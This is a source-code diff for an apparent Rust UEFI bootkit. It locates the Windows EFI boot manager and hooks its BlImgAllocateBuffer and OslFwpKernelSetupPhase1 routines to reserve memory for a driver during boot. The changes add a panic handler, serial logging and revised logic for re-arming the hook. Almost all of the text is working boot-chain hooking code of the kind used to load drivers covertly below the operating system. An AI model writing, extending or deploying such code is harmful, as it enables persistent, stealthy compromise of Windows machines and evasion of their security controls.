@@ -18,9 +18,35 @@ use uefi::prelude::*;
 use uefi::proto::loaded_image::LoadedImage;
 use uefi::table::boot::LoadImageSource;
 
+#[panic_handler]
+fn panic_handler(info: &core::panic::PanicInfo) -> ! {
+    if let Some(location) = info.location() {
+        log::error!(
+            "[-] Panic in {} at ({}, {}):",
+            location.file(),
+            location.line(),
+            location.column()
+        );
+        if let Some(message) = info.payload().downcast_ref::<&str>() {
+            log::error!("[-] {}", message);
+        }
+    }
+    loop {}
+}
+
+fn setup_efi(image_handle: Handle, system_table: &mut SystemTable<Boot>) {
+    com_logger::builder()
+        .base(0x2f8)
+        .filter(log::LevelFilter::Info)
+        .setup();
+    let boot_services = system_table.boot_services();
+    unsafe { boot_services.set_image_handle(image_handle) };
+    unsafe { uefi::allocator::init(boot_services) };
+}
+
 #[entry]
 fn efi_main(image_handle: Handle, mut system_table: SystemTable<Boot>) -> Status {
-    uefi_services::init(&mut system_table).unwrap();
+    setup_efi(image_handle, &mut system_table);
     let boot_services = system_table.boot_services();
     log::info!("[*] Searching Windows EFI bootmgr");
     let bootmgr_device_path = boot::windows_bootmgr_device_path(boot_services)
@@ -131,7 +157,9 @@ pub fn bl_img_allocate_buffer_hook(
     reserved: *mut c_void,
     flags: u32,
 ) -> uefi::Status {
-    let mut bl_img_allocate_buffer = unsafe { BL_IMG_ALLOCATE_BUFFER.take().unwrap().unhook() };
+    log::info!("[+] BlImgAllocateBufferHook hook successful!");
+    let mut current_hook = unsafe { BL_IMG_ALLOCATE_BUFFER.take().unwrap() };
+    let bl_img_allocate_buffer = unsafe { current_hook.unhook() };
     let status = bl_img_allocate_buffer(
         image_buffer,
         image_size,
@@ -152,25 +180,32 @@ pub fn bl_img_allocate_buffer_hook(
                 core::ptr::null_mut(),
                 0,
             );
-            if status != Status::SUCCESS {
+            if status == Status::SUCCESS {
+                log::info!(
+                    "[*] Allocated buffer for driver at address {:?}",
+                    DRIVER_ALLOCATED_BUFFER
+                );
+            } else {
+                log::info!("[!] Driver allocation failed! Status code {:?}", status);
                 DRIVER_ALLOCATED_BUFFER = core::ptr::null_mut();
             }
-            return status;
         }
+        return status;
     }
 
     // Couldn't allocate the buffer on this call, try on the next
     unsafe {
-        BL_IMG_ALLOCATE_BUFFER = Some(Hook::new(
-            &mut bl_img_allocate_buffer as *mut _,
-            bl_img_allocate_buffer_hook as *const _,
-        ));
+        current_hook.hook(bl_img_allocate_buffer_hook as *const _);
+        BL_IMG_ALLOCATE_BUFFER = Some(current_hook);
     }
+    log::info!("[*] Resuming BlImgAllocateBufferHook execution");
     status
 }
 
 fn osl_fwp_kernel_setup_phase1_hook(loader_block: *mut u8) -> uefi::Status {
+    log::info!("[+] OslFwpKernelSetupPhase1 hook successful!");
     let osl_fwp_kernel_setup_phase1 =
         unsafe { OSL_FWP_KERNEL_SETUP_PHASE1.take().unwrap().unhook() };
+    log::info!("[*] Resuming OslFwpKernelSetupPhase1 execution");
     osl_fwp_kernel_setup_phase1(loader_block)
 }
